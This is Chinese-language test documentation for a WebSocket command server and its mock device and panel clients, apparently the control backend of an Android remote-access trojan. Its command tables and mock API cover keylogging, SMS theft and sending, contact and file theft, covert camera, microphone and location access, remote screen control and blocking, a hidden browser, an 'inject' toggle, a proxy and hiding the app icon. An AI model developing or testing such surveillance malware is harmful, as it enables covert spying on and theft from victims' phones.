# WebSocket 测试文档

> PHP Swoole WebSocket 服务器的完整测试套件文档。

## 测试概览

| 测试类型 | 框架 | 数量 | 位置 |
|----------|------|------|------|
| Unit Tests | Pest (PHP) | 84 tests | `app/tests/Feature/WebSocket/` |
| E2E Tests | Node.js | 16 tests | `app/tests/e2e/` |

## 运行测试

### Unit Tests (Pest)

```bash
cd app

# 运行所有 WebSocket 测试
./vendor/bin/sail pest tests/Feature/WebSocket/

# 运行特定测试文件
./vendor/bin/sail pest tests/Feature/WebSocket/DeviceHandlerTest.php

# 运行完整测试套件
./vendor/bin/sail pest
```

### E2E Tests (Node.js)

```bash
cd app

# 1. 启动 WebSocket 服务器 (后台运行)
./vendor/bin/sail exec -d laravel.test php artisan websocket:serve

# 2. 安装依赖 (首次)
cd tests/e2e && npm install

# 3. 运行测试
npm test

# 连接到不同服务器
WS_URL=ws://192.168.1.100:8081 npm test
```

---

## Unit Tests 详解

### 测试文件结构

```
tests/Feature/WebSocket/
├── CheckPhoneHandlerTest.php   # 设备列表查询 (14 tests)
├── DeviceHandlerTest.php       # 设备消息处理 (12 tests)
├── PanelHandlerTest.php        # 面板控制命令 (24 tests)
├── PanelSendHandlerTest.php    # 面板数据请求 (34 tests)
├── SubscribeFunctionalTest.php # 订阅功能测试
├── UserIsolationFunctionalTest.php # 用户隔离测试
├── SubAccountTest.php          # 子账号测试
├── DeviceAuthFunctionalTest.php # 设备认证功能测试 (6 tests)
├── PanelAuthFunctionalTest.php  # Panel 认证功能测试 (9 tests)
└── PanelDeviceControlFunctionalTest.php # Panel 设备权限测试
```

### CheckPhoneHandlerTest

测试设备列表查询功能。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 空列表返回、用户设备返回、排除已删除设备、分页、页大小限制、最小页码 |
| filters | 按名称/国家/型号/无障碍状态过滤 |
| response format | 必需字段、分页元数据 |

### DeviceHandlerTest

测试设备端消息处理。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 忽略无 pid 消息、新设备注册、已存在设备不重复注册 |
| ping handling | 心跳记录、设备状态更新 |
| message forwarding | SMS/屏幕/键盘日志/麦克风/缩略图/文件下载转发 |
| proxy message | 代理首次消息、代理状态消息 |

### PanelHandlerTest

测试面板控制命令。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 忽略无 pid 消息 |
| join command | 订阅注册、离线状态返回 |
| ping command | 状态批量返回、连接关闭状态、未知状态 |
| disag command | 关闭设备连接、设备未连接处理 |
| screen commands | 点击/导航/音量/锁屏/键盘/粘贴/屏幕阻止/截图 |
| browser commands | 隐藏/普通浏览器 |
| proxy commands | 代理开/关 |
| broadcast commands | 警报/通知广播 |
| other commands | 搜索/聊天/未知命令转发 |

### PanelSendHandlerTest

测试面板数据请求。

| 测试组 | 测试项 |
|--------|--------|
| handle() | 忽略无 pid 消息 |
| screen commands | 屏幕共享 |
| camera commands | 摄像头开/关 |
| microphone commands | 麦克风开/关 |
| location commands | 位置开/关 |
| SMS commands | 短信请求、短信发送 |
| contacts commands | 联系人请求 |
| files commands | 文件列表/删除/下载/上传 |
| keylog commands | 键盘日志请求、按日期请求 |
| apps commands | 加载应用/打开应用/卸载应用 |
| activity records | 活动记录/通知/访问网站 |
| permissions commands | 权限请求 |
| device management | 重命名/删除/隐藏图标/通知 |
| dialog commands | 对话框 |
| inject commands | 注入开/关 |
| display commands | 显示 |

### DeviceAuthFunctionalTest

测试设备连接认证（HMAC-SHA256 token 验证），使用真实 WebSocket 服务器。

| 测试项 | 描述 |
|--------|------|
| 有效 token 设备正常上线 | 使用 `MockDevice::generateTestToken()` 生成有效 token，Panel 收到 `deviceOnline` |
| 无效 HMAC 拒绝 | 伪造 HMAC 签名，不创建设备记录，Panel 无推送 |
| 无 token 纯 email 拒绝 | 格式错误的 `user_email`，不创建设备记录 |
| 篡改 email 拒绝 | 用 userA 的 email 生成 token 后替换为 userB，验证失败 |
| 已存在设备不受认证影响 | 数据库已有记录的设备，即使 token 无效也能正常 ping |
| 空 email 拒绝 | `user_email` 为空，不创建设备记录 |

### PanelAuthFunctionalTest

测试 Panel WebSocket 连接认证（HMAC token 验证），使用真实 WebSocket 服务器。

| 测试项 | 描述 |
|--------|------|
| 有效 token subscribe 成功 | 使用 `MockPanel::generateTestPanelToken()` 生成有效 token，收到设备列表 |
| 无 token subscribe 被拒绝 | 不携带 token 的 subscribe 消息返回 `success: false` |
| 无效 HMAC subscribe 被拒绝 | 伪造 HMAC 签名的 token 返回认证失败 |
| 过期 token subscribe 被拒绝 | 超过 TTL 的 token 返回认证失败 |
| 有效 token join 成功 | Panel 携带 token join 设备，收到 `joinResponse` |
| 无效 token join 被拒绝 | 伪造 token 的 join 消息返回错误 |
| 过期 token join 被拒绝 | 超过 TTL 的 token join 消息返回错误 |
| 无 token join 被拒绝 | 未认证连接发送 panel 消息被拒绝 |
| 子账号可控制父账号设备 | 子账号 token 认证后可 join 父账号的设备 |

---

## E2E Tests 详解

### 测试文件结构

```
tests/e2e/
├── mock-device.js      # Mock 客户端 (MockDevice + MockPanel)
├── websocket.test.js   # E2E 测试用例
├── package.json        # Node.js 依赖
└── README.md           # E2E 测试文档
```

### 测试用例

| 测试 | 描述 | 验证点 |
|------|------|--------|
| Device can connect | 设备连接 | `isConnected === true` |
| Panel can connect | 面板连接 | `isConnected === true` |
| Panel receives checkphone | 设备列表 | `type === 'checkphone'`, `list` 为数组 |
| Panel can join device | 订阅设备 | `type === 'joinResponse'`, `pid` 匹配 |
| Panel receives device status | 设备状态 | `type === 'statusBatch'`, 状态有效 |
| Panel can request SMS | 短信数据 | `type === 'sms'`, 包含 `data` |
| Panel can request contacts | 联系人 | `type === 'loadcontacts'` |
| Panel can request files | 文件列表 | `type === 'files'` |
| Panel can request apps | 应用列表 | `type === 'loadapps'` |
| Panel can request location | 位置数据 | `type === 'loc'` |
| Panel can start screen share | 屏幕共享 | `type === 'screen'`, 包含尺寸 |
| Panel can send tap | 点击命令 | 命令发送成功 |
| Panel can send swipe | 滑动命令 | 命令发送成功 |
| Panel can send navigation | 导航命令 | 命令发送成功 |
| Device ping updates status | 心跳更新 | `phoneInfo` 存在 |
| Multiple devices can connect | 多设备 | 第二设备连接成功 |

### Mock 客户端 API

#### MockDevice

```javascript
const { MockDevice } = require('./mock-device');

const device = new MockDevice('device-id', {
    phoneName: 'Test Phone',
    model: 'Pixel 8',
    batteryCharge: '90',
    accessibility: '1',
    country: 'China',
    userEmail: 'test@example.com',
});

await device.connect();
device.sendPing();
device.disconnect();
```

### PHP MockDevice (Pest 功能测试)

PHP 版 `MockDevice` 自动生成有效的设备认证 token：

```php
use Tests\Support\MockDevice;

// 自动生成有效 token（user_email 不含 || 时自动调用 generateTestToken）
$device = new MockDevice($deviceId, [
    'host' => $host,
    'port' => $port,
    'user_email' => 'user@example.com',  // 自动变为 email||hmac.buildId.timestamp
]);

// 手动生成有效 token
$token = MockDevice::generateTestToken('user@example.com', $buildId);

// 生成无效 token（用于测试认证拒绝）
$invalidToken = MockDevice::generateInvalidToken('user@example.com');

// 绕过自动 token 生成：传入包含 || 的值
$device = new MockDevice($deviceId, [
    'user_email' => 'user@example.com||fake.1.0',  // 直接使用，不自动生成
]);
```

测试服务器通过 `WebSocketTestServer::getTestSecret()` 提供固定密钥，与 `MockDevice::generateTestToken()` 共享。

#### MockPanel

```javascript
const { MockPanel } = require('./mock-device');

const panel = new MockPanel({
    userEmail: 'admin@example.com',
});

await panel.connect();

// 设备列表
panel.checkPhone();

// 订阅设备
panel.joinDevice('device-id');

// 数据请求
panel.requestSms();
panel.requestContacts();
panel.requestFiles('/sdcard');
panel.requestApps();
panel.requestLocation();
panel.startScreenShare();

// 控制命令
panel.sendTap(500, 800);
panel.sendSwipe(500, 800, 500, 200);
panel.sendNavigation('ho');  // ho=Home, bak=Back, rec=Recent

// 消息监听
panel.onMessage((msg) => console.log(msg));

panel.disconnect();
```

### PHP MockPanel (Pest 功能测试)

PHP 版 `MockPanel` 支持 HMAC token 认证：

```php
use Tests\Support\MockPanel;

// 创建 Panel 并自动生成 token
$panel = new MockPanel($encryptedEmail, [
    'host' => $host,
    'port' => $port,
    'token' => MockPanel::generateTestPanelToken('user@example.com'),
]);

// subscribe 和 join 消息自动携带 token
$panel->subscribe();
$panel->joinDevice($deviceId);

// 生成无效 token (用于测试认证拒绝)
$invalidToken = MockPanel::generateInvalidPanelToken();

// 生成过期 token (用于测试 TTL 校验)
$expiredToken = MockPanel::generateExpiredPanelToken('user@example.com');
```

---

## 测试架构

```
┌─────────────────────────────────────────────────────────────┐
│                      Unit Tests (Pest)                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │ Mock Server │  │ Mock Conn   │  │ Handler Under Test  │  │
│  │ (Swoole)    │  │ Manager     │  │                     │  │
│  └─────────────┘  └─────────────┘  └─────────────────────┘  │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                     E2E Tests (Node.js)                      │
│  ┌─────────────┐       ┌─────────────┐       ┌───────────┐  │
│  │ MockDevice  │◄─────►│  WebSocket  │◄─────►│ MockPanel │  │
│  │ (ws client) │       │   Server    │       │(ws client)│  │
│  └─────────────┘       │  (Swoole)   │       └───────────┘  │
│                        └─────────────┘                       │
└─────────────────────────────────────────────────────────────┘
```

---

## 环境变量

| 变量 | 默认值 | 描述 |
|------|--------|------|
| `WS_URL` | `ws://localhost:8081` | WebSocket 服务器地址 |
| `DEVICE_ID` | `mock-device-{timestamp}` | Mock 设备 ID |
| `TEST_TIMEOUT` | `10000` | 测试超时时间 (ms) |

---

## 常见问题

### E2E 测试超时

**问题**: 数据请求测试 (SMS, Contacts 等) 超时失败

**原因**: Panel 在 Device 完全注册前发送请求，服务器找不到设备

**解决**: 在 join 测试后添加延迟等待设备注册完成

```javascript
await delay(500);  // Wait for device registration
panel.joinDevice(device.deviceId);
await delay(200);  // Wait for join processing
```

### Unit 测试权限警告

**问题**: `Permission denied` 写入 `.temp/test-results`

**原因**: Pest 缓存目录权限问题

**影响**: 不影响测试结果，仅为警告

---

## 扩展测试

### 添加新的 Unit Test

```php
// tests/Feature/WebSocket/NewHandlerTest.php
<?php

use App\WebSocket\Handlers\NewHandler;

describe('NewHandler', function () {
    beforeEach(function () {
        $this->handler = new NewHandler();
    });

    it('handles new command', function () {
        // Test implementation
    });
});
```

### 添加新的 E2E Test

```javascript
// 在 websocket.test.js 的 runTests() 中添加
await runner.run('New test case', async () => {
    const responsePromise = waitForMessage(panel, 'expected_type');
    panel.newMethod();
    const response = await responsePromise;
    
    if (response.type !== 'expected_type') {
        throw new Error(`Expected type 'expected_type', got '${response.type}'`);
    }
});
```
